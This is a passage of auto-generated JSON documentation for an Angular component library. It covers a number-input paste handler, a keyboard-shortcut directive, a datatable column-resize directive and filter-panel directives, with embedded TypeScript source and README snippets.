              "deprecationMessage": ""
            },
            {
              "name": "clipboardData",
              "type": "DataTransfer | null",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 63,
          "deprecated": false,
          "deprecationMessage": "",
          "rawdescription": "\n\nListens for the paste events.\nHandles spaces, long dash, period and commas.\nTries to the format, will be ignored if something fails.\n",
          "description": "<p>Listens for the paste events.\nHandles spaces, long dash, period and commas.\nTries to the format, will be ignored if something fails.</p>\n",
          "decorators": [
            {
              "name": "HostListener",
              "stringifiedArguments": "'paste', ['$event', '$event.clipboardData']"
            }
          ],
          "jsdoctags": [
            {
              "name": {
                "pos": 1378,
                "end": 1379,
                "flags": 4227072,
                "modifierFlagsCache": 0,
                "transformFlags": 0,
                "kind": 79,
                "escapedText": "e"
              },
              "type": "Event",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "pos": 1372,
                "end": 1377,
                "flags": 4227072,
                "modifierFlagsCache": 0,
                "transformFlags": 0,
                "kind": 79,
                "escapedText": "param"
              },
              "comment": "<p>event</p>\n"
            },
            {
              "name": {
                "pos": 1398,
                "end": 1411,
                "flags": 4227072,
                "modifierFlagsCache": 0,
                "transformFlags": 0,
                "kind": 79,
                "escapedText": "clipboardData"
              },
              "type": "DataTransfer | null",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "pos": 1392,
                "end": 1397,
                "flags": 4227072,
                "modifierFlagsCache": 0,
                "transformFlags": 0,
                "kind": 79,
                "escapedText": "param"
              },
              "comment": ""
            }
          ]
        },
        {
          "name": "setDisplayValue",
          "args": [
            {
              "name": "readonly",
              "type": "boolean",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 44,
          "deprecated": false,
          "deprecationMessage": "",
          "modifierKind": [
            123
          ],
          "jsdoctags": [
            {
              "name": "readonly",
              "type": "boolean",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        }
      ],
      "constructorObj": {
        "name": "constructor",
        "description": "",
        "deprecated": false,
        "deprecationMessage": "",
        "args": [
          {
            "name": "elementRef",
            "type": "ElementRef",
            "deprecated": false,
            "deprecationMessage": ""
          },
          {
            "name": "numberFormatPipe",
            "type": "NumberInputPipe",
            "deprecated": false,
            "deprecationMessage": ""
          }
        ],
        "line": 35,
        "jsdoctags": [
          {
            "name": "elementRef",
            "type": "ElementRef",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          },
          {
            "name": "numberFormatPipe",
            "type": "NumberInputPipe",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          }
        ]
      }
    },
    {
      "name": "QuickKeysDirective",
      "id": "directive-QuickKeysDirective-a3d0e9b4a365ef199891c086344ea98802aa68cd6d5637f105afdb6eea45cbd04b6e9305159252136638bd9ab5d0e690637ef37ba45bf84a178c91228340dcdd",
      "file": "libs/core/src/lib/sto-directives/quick-keys.directive.ts",
      "type": "directive",
      "description": "<p>QuickKeysDirective is used to implement shortcut keys on DOM elements, e.g to submit or reset a form on enter/escape</p>\n<form quickKeys (quickSubmit)=\"save()\" (quickCancel)=\"reset()\">\n",
      "rawdescription": "\n\nQuickKeysDirective is used to implement shortcut keys on DOM elements, e.g to submit or reset a form on enter/escape\n<form quickKeys (quickSubmit)=\"save()\" (quickCancel)=\"reset()\">\n",
      "sourceCode": "import { Directive, EventEmitter, HostListener, Input, Output } from '@angular/core';\nimport { UntypedFormGroup } from '@angular/forms';\nimport { Key } from '../abstract-and-interfaces/keyPress.enum';\n\n/**\n * QuickKeysDirective is used to implement shortcut keys on DOM elements, e.g to submit or reset a form on enter/escape\n * <form quickKeys (quickSubmit)=\"save()\" (quickCancel)=\"reset()\">\n */\n\n@Directive({\n  selector: '[stoQuickKeys]'\n})\nexport class QuickKeysDirective {\n  @Input() quickKeys: unknown;\n  /**\n   * Optional formGroup input, when used in combination with a reactive form\n   */\n  @Input() formGroup: UntypedFormGroup;\n  /**\n   * Emits when ctrl + enter is clicked in combination\n   * <form (quickSubmit)=\"save()\">\n   */\n  @Output() quickSubmit = new EventEmitter<void>();\n  /**\n   * Emits when escape is clicked\n   * <form (quickCancel)=\"cancel()\">\n   */\n  @Output() quickCancel = new EventEmitter<void>();\n\n  /**\n   * Listens on the host element for any keyup events\n   * @param e\n   */\n  @HostListener('keyup', ['$event'])\n  onKeyUp(e: KeyboardEvent) {\n    if (this.formGroup) {\n      this.handleFormKeys(e);\n    }\n    this.handleGenericKeydown(e);\n  }\n\n  /**\n   * Handler for generic keydowns, such as cancel events to close drawers\n   * @param e\n   * void\n   */\n  private handleGenericKeydown(e: KeyboardEvent) {\n    // Shortcuts that are useful outside of forms\n    if (e.keyCode === Key.Escape) {\n      this.quickCancel.emit();\n    }\n    if (!this.formGroup && e.keyCode === Key.Enter && e.ctrlKey) {\n      this.quickSubmit.emit();\n    }\n  }\n\n  /**\n   * Handler for form specific shortcuts, such as saving the form\n   * @param e\n   */\n  private handleFormKeys(e: KeyboardEvent) {\n    if (this.formGroup.pristine) {\n      return;\n    }\n    if (e.keyCode === Key.Enter && e.ctrlKey) {\n      this.quickSubmit.emit();\n    }\n  }\n}\n",
      "selector": "[stoQuickKeys]",
      "providers": [],
      "inputsClass": [
        {
          "name": "formGroup",
          "deprecated": false,
          "deprecationMessage": "",
          "rawdescription": "\n\nOptional formGroup input, when used in combination with a reactive form\n",
          "description": "<p>Optional formGroup input, when used in combination with a reactive form</p>\n",
          "line": 18,
          "type": "UntypedFormGroup",
          "decorators": []
        },
        {
          "name": "quickKeys",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 14,
          "type": "",
          "decorators": []
        }
      ],
      "outputsClass": [
        {
          "name": "quickCancel",
          "defaultValue": "new EventEmitter<void>()",
          "deprecated": false,
          "deprecationMessage": "",
          "rawdescription": "\n\nEmits when escape is clicked\n<form (quickCancel)=\"cancel()\">\n",
          "description": "<p>Emits when escape is clicked</p>\n<form (quickCancel)=\"cancel()\">\n",
          "line": 28,
          "type": "EventEmitter"
        },
        {
          "name": "quickSubmit",
          "defaultValue": "new EventEmitter<void>()",
          "deprecated": false,
          "deprecationMessage": "",
          "rawdescription": "\n\nEmits when ctrl + enter is clicked in combination\n<form (quickSubmit)=\"save()\">\n",
          "description": "<p>Emits when ctrl + enter is clicked in combination</p>\n<form (quickSubmit)=\"save()\">\n",
          "line": 23,
          "type": "EventEmitter"
        }
      ],
      "deprecated": false,
      "deprecationMessage": "",
      "hostBindings": [],
      "hostListeners": [
        {
          "name": "keyup",
          "args": [
            {
              "name": "e",
              "type": "KeyboardEvent",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "argsDecorator": [
            "$event"
          ],
          "deprecated": false,
          "deprecationMessage": "",
          "rawdescription": "\n\nListens on the host element for any keyup events\n",
          "description": "<p>Listens on the host element for any keyup events</p>\n",
          "jsdoctags": [
            {
              "pos": 992,
              "end": 1004,
              "flags": 4227072,
              "modifierFlagsCache": 0,
              "transformFlags": 0,
              "kind": 338,
              "tagName": {
                "pos": 993,
                "end": 998,
                "flags": 4227072,
                "modifierFlagsCache": 0,
                "transformFlags": 0,
                "kind": 79,
                "escapedText": "param"
              },
              "comment": "",
              "name": {
                "pos": 999,
                "end": 1000,
                "flags": 4227072,
                "modifierFlagsCache": 0,
                "transformFlags": 0,
                "kind": 79,
                "escapedText": "e"
              },
              "isNameFirst": true,
              "isBracketed": false
            }
          ],
          "line": 35
        }
      ],
      "propertiesClass": [],
      "methodsClass": [
        {
          "name": "handleFormKeys",
          "args": [
            {
              "name": "e",
              "type": "KeyboardEvent",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 61,
          "deprecated": false,
          "deprecationMessage": "",
          "rawdescription": "\n\nHandler for form specific shortcuts, such as saving the form\n",
          "description": "<p>Handler for form specific shortcuts, such as saving the form</p>\n",
          "modifierKind": [
            121
          ],
          "jsdoctags": [
            {
              "name": {
                "pos": 1652,
                "end": 1653,
                "flags": 4227072,
                "modifierFlagsCache": 0,
                "transformFlags": 0,
                "kind": 79,
                "escapedText": "e"
              },
              "type": "KeyboardEvent",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "pos": 1646,
                "end": 1651,
                "flags": 4227072,
                "modifierFlagsCache": 0,
                "transformFlags": 0,
                "kind": 79,
                "escapedText": "param"
              },
              "comment": ""
            }
          ]
        },
        {
          "name": "handleGenericKeydown",
          "args": [
            {
              "name": "e",
              "type": "KeyboardEvent",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 47,
          "deprecated": false,
          "deprecationMessage": "",
          "rawdescription": "\n\nHandler for generic keydowns, such as cancel events to close drawers\nvoid\n",
          "description": "<p>Handler for generic keydowns, such as cancel events to close drawers\nvoid</p>\n",
          "modifierKind": [
            121
          ],
          "jsdoctags": [
            {
              "name": {
                "pos": 1267,
                "end": 1268,
                "flags": 4227072,
                "modifierFlagsCache": 0,
                "transformFlags": 0,
                "kind": 79,
                "escapedText": "e"
              },
              "type": "KeyboardEvent",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "pos": 1261,
                "end": 1266,
                "flags": 4227072,
                "modifierFlagsCache": 0,
                "transformFlags": 0,
                "kind": 79,
                "escapedText": "param"
              },
              "comment": "<p>void</p>\n"
            }
          ]
        },
        {
          "name": "onKeyUp",
          "args": [
            {
              "name": "e",
              "type": "KeyboardEvent",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 35,
          "deprecated": false,
          "deprecationMessage": "",
          "rawdescription": "\n\nListens on the host element for any keyup events\n",
          "description": "<p>Listens on the host element for any keyup events</p>\n",
          "decorators": [
            {
              "name": "HostListener",
              "stringifiedArguments": "'keyup', ['$event']"
            }
          ],
          "jsdoctags": [
            {
              "name": {
                "pos": 999,
                "end": 1000,
                "flags": 4227072,
                "modifierFlagsCache": 0,
                "transformFlags": 0,
                "kind": 79,
                "escapedText": "e"
              },
              "type": "KeyboardEvent",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "pos": 993,
                "end": 998,
                "flags": 4227072,
                "modifierFlagsCache": 0,
                "transformFlags": 0,
                "kind": 79,
                "escapedText": "param"
              },
              "comment": ""
            }
          ]
        }
      ],
      "readme": "<h4 id=\"quickkeysdirective\">QuickKeysDirective</h4>\n<p>QuickKeysDirective is used to implement shortcut keys on DOM elements, e.g to submit or reset a form on enter/escape</p>\n<h5 id=\"general-usage\">General usage</h5>\n<p>Currently we support two quick-key actions:</p>\n<ul>\n<li>CTRL+Enter to save</li>\n<li>Escape to cancel</li>\n</ul>\n<p>These emit on (quickSubmit) and (quickCancel) respectively.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;form [formGroup]=&quot;form&quot; quickKeys \n    (quickSubmit)=&quot;save()&quot;\n    (quickCancel)=&quot;cancel()&quot;&gt;...&lt;/form&gt;</code></pre></div><h5 id=\"with-a-formgroup\">With a FormGroup</h5>\n<p>The quick keys can be connected to a FormGroup, which allows us to run some default business checks before emitting (check if form is pristine before emitting submit, for example)</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;form [formGroup]=&quot;form&quot; quickKeys (quickSubmit)=&quot;save()&quot;&gt;...&lt;/form&gt;</code></pre></div>"
    },
    {
      "name": "StoDatatableResizeDirective",
      "id": "directive-StoDatatableResizeDirective-15639496ff26d76162b74c8981f36063d26f38c15e13bc482787814bd288aa2854ca8d38600f4b8a338b1057ce3d6156ca2cc6b67435b3af942ecf87f2d6cc94",
      "file": "libs/datatable/src/lib/sto-datatable/sto-datatable-header/sto-datatable-resize.directive.ts",
      "type": "directive",
      "description": "",
      "rawdescription": "\n",
      "sourceCode": "import { AfterViewInit, Directive, ElementRef, EventEmitter, HostListener, Input, OnDestroy, Output } from '@angular/core';\nimport { Column } from '../columns';\nimport { fromEvent, ReplaySubject, Subject, Subscription } from 'rxjs';\nimport { take, takeUntil } from 'rxjs/operators';\n\n@Directive({\n  selector: '[stoDatatableResize]',\n  exportAs: 'stoDatatableResize'\n})\nexport class StoDatatableResizeDirective implements AfterViewInit, OnDestroy {\n  @Input()\n  column: Column;\n  // eslint-disable-next-line @angular-eslint/no-output-native\n  @Output()\n  // eslint-disable-next-line @angular-eslint/no-output-native\n  resize = new EventEmitter<number>();\n  @Output()\n  resizeEnd = new EventEmitter<number>();\n  // @HostBinding('draggable')\n  // draggable = true;\n  private startOffset: number;\n  private initial: number;\n  private sub: Subscription;\n  public width$ = new ReplaySubject<number | null>();\n  private width: number;\n  private moveComplete$ = new Subject<boolean>();\n\n\n  constructor(private el: ElementRef<HTMLElement>) {\n  }\n\n  @HostListener('mousedown', [ '$event' ])\n  onMouseDown(event: MouseEvent) {\n    event.stopPropagation();\n    this.startOffset = event.screenX;\n    this.initial = this.column.flexBasis || 80;\n    fromEvent<MouseEvent>(document, 'mouseup')\n      .pipe(take(1))\n      .subscribe((ev) => this.onMouseUp(ev));\n    fromEvent<MouseEvent>(document, 'mousemove')\n      .pipe(takeUntil(this.moveComplete$))\n      .subscribe((ev) => this.move(ev));\n  }\n\n  onMouseUp(event: MouseEvent) {\n      event.stopPropagation();\n      this.moveComplete$.next(true);\n      this.width$.next(null);\n      this.resizeEnd.emit(this.width);\n  }\n\n  @HostListener('contextmenu', [ '$event' ])\n  ctxMenu(event: MouseEvent) {\n    event.stopPropagation();\n  }\n\n  private move(event: MouseEvent) {\n    const move = event.screenX - this.startOffset;\n    const width = this.initial + move < 40 ? 40 : this.initial + move;\n    this.width$.next(width);\n    this.width = width;\n  }\n\n  ngAfterViewInit(): void {\n    this.el.nativeElement.classList.add('sto-mdl-table__header__row__cell__resize-handle');\n  }\n\n  ngOnDestroy() {\n    this.moveComplete$.next(true);\n    this.moveComplete$.complete();\n    this.width$.complete();\n  }\n\n}\n",
      "selector": "[stoDatatableResize]",
      "providers": [],
      "inputsClass": [
        {
          "name": "column",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 12,
          "type": "Column",
          "decorators": []
        }
      ],
      "outputsClass": [
        {
          "name": "resize",
          "defaultValue": "new EventEmitter<number>()",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 16,
          "type": "EventEmitter"
        },
        {
          "name": "resizeEnd",
          "defaultValue": "new EventEmitter<number>()",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 18,
          "type": "EventEmitter"
        }
      ],
      "deprecated": false,
      "deprecationMessage": "",
      "hostBindings": [],
      "hostListeners": [
        {
          "name": "contextmenu",
          "args": [
            {
              "name": "event",
              "type": "MouseEvent",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "argsDecorator": [
            "$event"
          ],
          "deprecated": false,
          "deprecationMessage": "",
          "line": 53
        },
        {
          "name": "mousedown",
          "args": [
            {
              "name": "event",
              "type": "MouseEvent",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "argsDecorator": [
            "$event"
          ],
          "deprecated": false,
          "deprecationMessage": "",
          "line": 33
        }
      ],
      "propertiesClass": [
        {
          "name": "initial",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "number",
          "optional": false,
          "description": "",
          "line": 22,
          "modifierKind": [
            121
          ]
        },
        {
          "name": "moveComplete$",
          "defaultValue": "new Subject<boolean>()",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "optional": false,
          "description": "",
          "line": 26,
          "modifierKind": [
            121
          ]
        },
        {
          "name": "startOffset",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "number",
          "optional": false,
          "description": "",
          "line": 21,
          "modifierKind": [
            121
          ]
        },
        {
          "name": "sub",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "Subscription",
          "optional": false,
          "description": "",
          "line": 23,
          "modifierKind": [
            121
          ]
        },
        {
          "name": "width",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "number",
          "optional": false,
          "description": "",
          "line": 25,
          "modifierKind": [
            121
          ]
        },
        {
          "name": "width$",
          "defaultValue": "new ReplaySubject<number | null>()",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "optional": false,
          "description": "",
          "line": 24,
          "modifierKind": [
            123
          ]
        }
      ],
      "methodsClass": [
        {
          "name": "ctxMenu",
          "args": [
            {
              "name": "event",
              "type": "MouseEvent",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 53,
          "deprecated": false,
          "deprecationMessage": "",
          "decorators": [
            {
              "name": "HostListener",
              "stringifiedArguments": "'contextmenu', ['$event']"
            }
          ],
          "jsdoctags": [
            {
              "name": "event",
              "type": "MouseEvent",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "move",
          "args": [
            {
              "name": "event",
              "type": "MouseEvent",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 57,
          "deprecated": false,
          "deprecationMessage": "",
          "modifierKind": [
            121
          ],
          "jsdoctags": [
            {
              "name": "event",
              "type": "MouseEvent",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "ngAfterViewInit",
          "args": [],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 64,
          "deprecated": false,
          "deprecationMessage": ""
        },
        {
          "name": "ngOnDestroy",
          "args": [],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 68,
          "deprecated": false,
          "deprecationMessage": ""
        },
        {
          "name": "onMouseDown",
          "args": [
            {
              "name": "event",
              "type": "MouseEvent",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 33,
          "deprecated": false,
          "deprecationMessage": "",
          "decorators": [
            {
              "name": "HostListener",
              "stringifiedArguments": "'mousedown', ['$event']"
            }
          ],
          "jsdoctags": [
            {
              "name": "event",
              "type": "MouseEvent",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "onMouseUp",
          "args": [
            {
              "name": "event",
              "type": "MouseEvent",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 45,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "event",
              "type": "MouseEvent",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        }
      ],
      "implements": [
        "AfterViewInit",
        "OnDestroy"
      ],
      "constructorObj": {
        "name": "constructor",
        "description": "",
        "deprecated": false,
        "deprecationMessage": "",
        "args": [
          {
            "name": "el",
            "type": "ElementRef<HTMLElement>",
            "deprecated": false,
            "deprecationMessage": ""
          }
        ],
        "line": 26,
        "jsdoctags": [
          {
            "name": "el",
            "type": "ElementRef<HTMLElement>",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          }
        ]
      }
    },
    {
      "name": "StoFilterActions",
      "id": "directive-StoFilterActions-b0f9a90b956cb63ef40defdf7ae45c5b5a578a79df0bbb7e3133eff22d4ad449ab714db9d8e7ac0b02040c9a7543eda5a0c526091e497cc853019c112c2b8006",
      "file": "libs/common/src/lib/sto-filter/sto-filter-panel.component.ts",
      "type": "directive",
      "description": "",
      "rawdescription": "\n",
      "sourceCode": "import {\n  AfterViewInit,\n  ChangeDetectorRef,\n  Component,\n  Directive,\n  EventEmitter,\n  HostBinding,\n  Input,\n  OnInit,\n  Output,\n  ViewChild,\n  ViewContainerRef,\n  ViewEncapsulation\n} from '@angular/core';\nimport { FilterForm, FilterList } from './filter';\n\n/**\n * Sto filter panel is an extension of mat-accordion\n */\n@Component({\n  selector: 'sto-filter-panel',\n  templateUrl: './sto-filter-panel.component.html',\n  encapsulation: ViewEncapsulation.None,\n  styleUrls: [ './sto-filter-panel.component.scss' ]\n})\nexport class StoFilterPanelComponent implements OnInit, AfterViewInit {\n  set contentHeight(contentHeight: number) {\n    this._contentHeight = contentHeight;\n  }\n\n  get contentHeight(): number {\n    return this._contentHeight;\n  }\n\n  /**\n   * If the filter panel should be expandable. Default true.\n   */\n  @Input()\n  expandable = true;\n\n  /**\n   * If the filter panel should be expanded by default. Default false.\n   */\n  @Input()\n  expanded: boolean;\n\n  /**\n   * List of active filters.\n   */\n  @Input()\n  filterList: FilterList[];\n\n  /**\n   * Emits {isExpanded: boolean, contentHeight: number } where\n   * isExpanded is true if the panel opens and false if not.\n   * ContentHeight is the height of the expanded content i pixels.\n   *  {EventEmitter<{isExpanded: boolean, contentHeight: number }>}\n   */\n  @Output() toggled = new EventEmitter<{ isExpanded: boolean, contentHeight: number }>();\n  /**\n   * Emits when a filter should be cleared (if applicable)\n   */\n  @Output()\n  clearFilter = new EventEmitter();\n\n  /**\n   * Buttons and actions on the left side of the separator if both table and filter actions is present.\n   */\n  @ViewChild('tableActions') contentWrapper: { nativeElement: HTMLElement; };\n  /**\n   * Buttons and actions on the right side of the separator if both table and filter actions is present.\n   */\n  @ViewChild('filterActions') contentWrapper2: { nativeElement: HTMLElement; };\n  @ViewChild('filterForm') filterForm: { nativeElement: HTMLElement; };\n\n  @Input()\n  public host: FilterForm<Record<string, unknown>>;\n  private _contentHeight: number;\n\n  public hasSeperator = false;\n\n  constructor(\n    private cdr: ChangeDetectorRef,\n    private vcRef: ViewContainerRef) {\n    try {\n      // eslint-disable-next-line @typescript-eslint/no-explicit-any\n      this.host = ( this.vcRef as any )._view.context;\n    } catch ( ex ) {\n      // most likely this fails only for tests after Ivy (Angular 9), as it no longer wraps with a component.\n    }\n  }\n\n  public toggle() {\n    this.expanded = !this.expanded;\n    this.setContentHeight();\n    this.toggled.emit({ isExpanded: this.expanded, contentHeight: this.contentHeight });\n  }\n\n  ngOnInit() {\n    if ( this.expandable ) {\n      if ( this.expanded === undefined ) {\n        this.expanded = true;\n      }\n    } else {\n      this.expanded = false;\n    }\n\n    this.needSeperator();\n  }\n\n  ngAfterViewInit() {\n    this.needSeperator();\n    this.setContentHeight();\n  }\n\n  private setContentHeight() {\n    const element = this.filterForm.nativeElement;\n    if ( element ) {\n      const contentArea = element.parentElement;\n      this.contentHeight = contentArea?.offsetHeight || 0;\n    }\n  }\n\n  public needSeperator() {\n    this.hasSeperator = false;\n    if ( this.contentWrapper && this.contentWrapper2 ) {\n      const el1 = this.contentWrapper.nativeElement;\n      const el2 = this.contentWrapper2.nativeElement;\n      if ( el1.children && el2.children ) {\n        if ( el1.children.length > 0 && el2.children.length > 0 ) {\n          const hasActionButtons = el1.children[ 0 ].children.length > 0;\n          const hasTableButtons = el2.children[ 0 ].children.length > 0;\n\n          this.hasSeperator = hasActionButtons && hasTableButtons;\n          this.cdr.detectChanges();\n        }\n      }\n    }\n\n\n  }\n\n  _clearFilter(key: string, index?: number) {\n    if (index === null) {\n      return;\n    }\n    try {\n      this.host.clearFilter(key, index);\n    } catch {\n      this.clearFilter.emit({ key, index });\n    }\n  }\n}\n\n/**\n * <mat-panel-description> directive.\n *\n * This direction is to be used inside of the MdExpansionPanelHeader component.\n */\n@Directive({\n  // eslint-disable-next-line @angular-eslint/directive-selector\n  selector: 'sto-filter-title'\n})\nexport class StoFilterTitle {\n}\n\n\n@Directive({\n  selector: 'sto-filter-table-actions'\n})\nexport class StoFilterTableActions {\n  @HostBinding('class.sto-filter-table-actions')\n  className = true;\n}\n\n@Directive({\n  selector: 'sto-filter-actions'\n})\nexport class StoFilterActions {\n}\n\n@Component({\n  selector: 'sto-filter-actions-bar',\n  template: `\n    <ng-content></ng-content>\n    <button mat-icon-button\n            class=\"toggle-expand-button\"\n            *ngIf=\"expandable\"\n            title=\"Toggle filter panel\"\n            (click)=\"toggle.emit()\">\n      <mat-icon>filter_list</mat-icon>\n    </button>\n\n  `\n})\n// eslint-disable-next-line @angular-eslint/component-class-suffix\nexport class StoFilterActionsBar {\n  @HostBinding('class.sto-filter-actions')\n  hasClass = true;\n\n  @Input() set expanded(expanded: boolean) {\n    this._expanded = expanded;\n  }\n\n  get expanded(): boolean {\n    return this._expanded;\n  }\n\n  @Input() expandable: boolean;\n  private _expanded: boolean;\n\n  @Output() toggle = new EventEmitter<void>();\n\n  // eslint-disable-next-line @typescript-eslint/no-unused-vars\n  onChange(event: unknown) {\n    // console.log($event);\n  }\n\n\n}\n\n",
      "selector": "sto-filter-actions",
      "providers": [],
      "inputsClass": [],
      "outputsClass": [],
      "deprecated": false,
      "deprecationMessage": "",
      "hostBindings": [],
      "hostListeners": [],
      "propertiesClass": [],
      "methodsClass": [],
      "readme": "<h3 id=\"sto-filter-panel\">Sto filter panel</h3>\n<p>Filter panel is a togglable panel with a header and a content area, and is an extension of expansion panel from material.\nHas build in content areas for title, table actions and filter actions.\nThe panel has a toggle button that open and closes the content area and emits an event with the height of the content area.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-filter-panel [expandable]=&quot;true&quot; (toggled)=&quot;toggleService.isToggled.emit($event)&quot;&gt;\n    &lt;sto-filter-title&gt;Integration Logs&lt;/sto-filter-title&gt;\n        &lt;sto-filter-table-actions&gt;\n           &lt;button mat-button&gt;\n           New&lt;mat-icon&gt;arrow_drop_down&lt;/mat-icon&gt;\n           &lt;/button&gt;    \n        &lt;/sto-filter-table-actions&gt;\n           &lt;sto-filter-actions&gt;\n                &lt;button mat-icon-button&gt;\n                  &lt;mat-icon&gt;refresh&lt;/mat-icon&gt;\n               &lt;/button&gt;\n            &lt;/sto-filter-actions&gt;\n        &lt;form class=&quot;sto-form sto-grid sto-grid--6&quot; [formGroup]=&quot;form&quot; &gt;\n             &lt;div class=&quot;sto-grid__column&quot;&gt;\n                   &lt;mat-form-field&gt;\n                     ...\n                    &lt;/mat-form-field&gt;\n             &lt;/div&gt;\n        &lt;/form&gt;\n&lt;/sto-filter-panel&gt;</code></pre></div><p>####Selector / Content projection</p>\n<h5 id=\"sto-filter-title\">sto-filter-title</h5>\n<p>The title. Usually just a string but could be html.</p>\n<h5 id=\"sto-filter-table-actions\">sto-filter-table-actions</h5>\n<p>Buttons and actions on the left side of the separator if both table and filter actions is present.\n(The name is from a time where all actions left of the separator was related to the table).</p>\n<h5 id=\"sto-filter-actions\">sto-filter-actions</h5>\n<p>Buttons and actions on the right side of the separator if both table and filter actions is present.\n(The name is from a time where all actions right of the separator was related to the table).</p>\n<p>####Input</p>\n<h5 id=\"expandable\">expandable</h5>\n<p>If the filter panel should be expandable. Default true.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-filter-panel [expandable]=&quot;true&quot;&gt;</code></pre></div><h5 id=\"expanded\">expanded</h5>\n<p>If the filter panel should be expanded by default. Default false.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-filter-panel [expanded]=&quot;true&quot;&gt;</code></pre></div><p>####Output</p>\n<h5 id=\"toggled\">toggled</h5>\n<p>Emits {isExpanded: boolean, contentHeight: number } where\nisExpanded is true if the panel opens and false if not.\nContentHeight is the height of the expanded content. </p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-filter-panel (toggled)=&quot;onToggle($event)&quot;&gt;</code></pre></div>"
    },
    {
      "name": "StoFilterTableActions",
      "id": "directive-StoFilterTableActions-b0f9a90b956cb63ef40defdf7ae45c5b5a578a79df0bbb7e3133eff22d4ad449ab714db9d8e7ac0b02040c9a7543eda5a0c526091e497cc853019c112c2b8006",
      "file": "libs/common/src/lib/sto-filter/sto-filter-panel.component.ts",
      "type": "directive",
      "description": "",
      "rawdescription": "\n",
      "sourceCode": "import {\n  AfterViewInit,\n  ChangeDetectorRef,\n  Component,\n  Directive,\n  EventEmitter,\n  HostBinding,\n  Input,\n  OnInit,\n  Output,\n  ViewChild,\n  ViewContainerRef,\n  ViewEncapsulation\n} from '@angular/core';\nimport { FilterForm, FilterList } from './filter';\n\n/**\n * Sto filter panel is an extension of mat-accordion\n */\n@Component({\n  selector: 'sto-filter-panel',\n  templateUrl: './sto-filter-panel.component.html',\n  encapsulation: ViewEncapsulation.None,\n  styleUrls: [ './sto-filter-panel.component.scss' ]\n})\nexport class StoFilterPanelComponent implements OnInit, AfterViewInit {\n  set contentHeight(contentHeight: number) {\n    this._contentHeight = contentHeight;\n  }\n\n  get contentHeight(): number {\n    return this._contentHeight;\n  }\n\n  /**\n   * If the filter panel should be expandable. Default true.\n   */\n  @Input()\n  expandable = true;\n\n  /**\n   * If the filter panel should be expanded by default. Default false.\n   */\n  @Input()\n  expanded: boolean;\n\n  /**\n   * List of active filters.\n   */\n  @Input()\n  filterList: FilterList[];\n\n  /**\n   * Emits {isExpanded: boolean, contentHeight: number } where\n   * isExpanded is true if the panel opens and false if not.\n   * ContentHeight is the height of the expanded content i pixels.\n   *  {EventEmitter<{isExpanded: boolean, contentHeight: number }>}\n   */\n  @Output() toggled = new EventEmitter<{ isExpanded: boolean, contentHeight: number }>();\n  /**\n   * Emits when a filter should be cleared (if applicable)\n   */\n  @Output()\n  clearFilter = new EventEmitter();\n\n  /**\n   * Buttons and actions on the left side of the separator if both table and filter actions is present.\n   */\n  @ViewChild('tableActions') contentWrapper: { nativeElement: HTMLElement; };\n  /**\n   * Buttons and actions on the right side of the separator if both table and filter actions is present.\n   */\n  @ViewChild('filterActions') contentWrapper2: { nativeElement: HTMLElement; };\n  